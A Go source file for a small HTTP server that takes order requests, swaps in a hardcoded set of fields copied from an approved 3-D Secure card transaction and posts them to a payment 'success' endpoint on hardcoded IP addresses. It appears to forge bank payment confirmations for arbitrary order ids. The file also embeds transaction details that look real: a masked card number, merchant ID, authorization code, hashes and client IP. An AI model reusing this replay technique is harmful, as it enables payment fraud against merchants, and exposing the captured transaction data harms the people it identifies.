package main

import (
	"io"
	"net/http"

	"github.com/sirupsen/logrus"
)

func main() {
	http.HandleFunc("/index-gold", HandleOrder(false))
	http.HandleFunc("/index-gold-test", HandleOrder(true))
	//http.HandlerFunc().ServeHTTP()
	http.ListenAndServe("localhost:8888", nil)
}

func HandleOrder(isTest bool) func(w http.ResponseWriter, r *http.Request) {
	return func(w http.ResponseWriter, r *http.Request) {
		r.ParseForm()
		err := r.ParseForm()
		if err != nil {
			logrus.New().WithError(err).Error("failed to parse form: ")
			return
		}
		logger := logrus.New()
		logger.Level = logrus.DebugLevel
		logger.
			WithField("form", r.Form).
			WithField("path", r.URL).
			WithField("method", r.Method).
			WithField("headers", r.Header).
			Info("got request")

		var newRequest *http.Request
		newRequest = r

		for key := range r.Form {
			newRequest.Form.Set(key, r.Form.Get(key))
			//newRequest.PostForm.Set(key, r.Form.Get(key))
		}

		for key, val := range success {
			newRequest.Form.Set(key, val)
			//newRequest.PostForm.Set(key, val)
		}

		newRequest.Form.Set("ReturnOid", r.Form.Get("oid"))
		//newRequest.PostForm.Set("ReturnOid", r.Form.Get("oid"))
		// logger.
		// 	WithField("form", newRequest.Form).
		// 	WithField("path", newRequest.URL).
		// 	WithField("method", newRequest.Method).
		// 	WithField("headers", newRequest.Header).
		// 	Info("before end")
		var url string
		if isTest {
			url = "http://195.201.42.71:2442/v1/payment/softpay/success"
		} else {
			url = "http://94.130.77.97:2442/v1/payment/softpay/success"
		}

		resp, err := http.PostForm(url, newRequest.Form)
		if err != nil {
			logger.WithError(err).Error("got error")
			return
		}
		defer resp.Body.Close()

		w.Header().Set("Content-Type", resp.Header.Get("Content-Type"))
		w.Header().Set("Content-Length", resp.Header.Get("Content-Length"))
		w.Header().Set("Location", resp.Header.Get("Location"))
		w.WriteHeader(resp.StatusCode)
		// w.Write(nil)
		io.Copy(w, resp.Body)
	}
}

var requestFields = []string{
	"clientid",
	"storekey",
	"storetype",
	"rnd",
	"oid",
	"okurl",
	"failurl",
	"trantype",
	"encoding",
	"hashAlgorithm",
	"description",
	"amount",
	"currency",
	"lang"}

var success = map[string]string{
	"md":                              "516875:750B12E7A509C3C7E8703C8231FBDD142A663251A1999851EF0A1C596B0249A8:3558:##10743201",
	"SID":                             "",
	"eci":                             "02",
	"xid":                             "QWYt9S0PlO1eyAshxHr7XRTeTJs=",
	"HASH":                            "0bCsV6j7Uz9moRzg8ESk+6b5n5CumyUvGmvM3o/DJWFzjW6DDjsj8mRGylwJ11ja6DiBg0mOIsgdV2j24S5H2g==",
	"cavv":                            "jJd5OUfYn5T/CBE6ITH+BIcAAAA=",
	"dsId":                            "2",
	"ACQBIN":                          "548161",
	"ErrMsg":                          "",
	"TRANID":                          "17792474",
	"digest":                          "digest",
	"TransId":                         "18032M6nC16725",
	"acqStan":                         "003171",
	"version":                         "",
	"AuthCode":                        "1488",
	"Response":                        "Approved",
	"SettleId":                        "569",
	"clientIp":                        "37.203.19.15",
	"iReqCode":                        "",
	"mdStatus":                        "1",
	"txstatus":                        "Y",
	"MaskedPan":                       "516875***8857",
	"ReturnOid":                       "",
	"HASHPARAMS":                      "clientid|oid|AuthCode|ProcReturnCode|Response|mdStatus|cavv|eci|md|rnd",
	"HostRefNum":                      "803212003171",
	"iReqDetail":                      "",
	"instalment":                      "",
	"mdErrorMsg":                      "",
	"merchantID":                      "10743201",
	"vendorCode":                      "",
	"refreshtime":                     "300",
	"EXTRA_TRXDATE":                   "20180201 12:56:39",
	"HASHPARAMSVAL":                   "10743201|WEBWELLNESSSOFTipb4i7ic6if25n6q|14818B|00|Approved|1|jJd5OUfYn5T/CBE6ITH+BIcAAAA=|02|516875:750B12E7A509C3C7E8703C8231FBDD142A663251A1999851EF0A1C596B0249A8:3558:##10743201|QH1oSrMU5dRD0CzbPqFY",
	"PAResSyntaxOK":                   "",
	"PAResVerified":                   "",
	"cavvAlgorithm":                   "",
	"ProcReturnCode":                  "00",
	"EXTRA_CARDBRAND":                 "SHEBBANK",
	"payResults_dsId":                 "2",
	"EXTRA_CARDISSUER":                "UNKNOWN",
	"EXTRA_AAVRESPONSECODE":           "",
	"Ecom_Payment_Card_ExpDate_Year":  "21",
	"Ecom_Payment_Card_ExpDate_Month": "04",
}
